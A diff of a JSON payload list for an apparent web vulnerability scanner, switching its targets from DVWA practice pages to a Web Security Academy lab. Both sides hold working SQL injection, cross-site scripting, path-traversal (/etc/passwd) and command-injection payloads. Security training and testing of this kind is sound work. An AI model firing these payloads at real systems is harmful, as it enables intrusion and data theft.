@@ -1,32 +1,12 @@
 [
   {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit",
+    "url": "https://0a5c001d042ad831802c9ada009c00f2.web-security-academy.net/filter",
     "method": "GET",
-    "param": "id",
-    "values": ["1' AND '1'='1", "1' AND '1'='2", "1' AND SLEEP(5)--"]
-  },
-  {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/xss_d/",
-    "method": "GET",
-    "param": "default",
-    "values": ["English<script>alert(1)</script>", "French<img src=x onerror=alert(1)>"]
-  },
-  {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/fi/?page=include.php",
-    "method": "GET",
-    "param": "page",
-    "values": ["../../../../../../etc/passwd", "http://www.google.com"]
-  },
-  {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/exec/",
-    "method": "POST",
-    "param": "ip",
-    "values": ["127.0.0.1; id", "127.0.0.1 && whoami"]
-  },
-  {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/weak_id/",
-    "method": "POST",
-    "param": "step",
-    "values": ["1"]
+    "param": "category",
+    "values": [
+      "' OR '1'='1",
+      "' UNION SELECT NULL,NULL--",
+      "\"><script>alert(1)</script>"
+    ]
   }
 ]
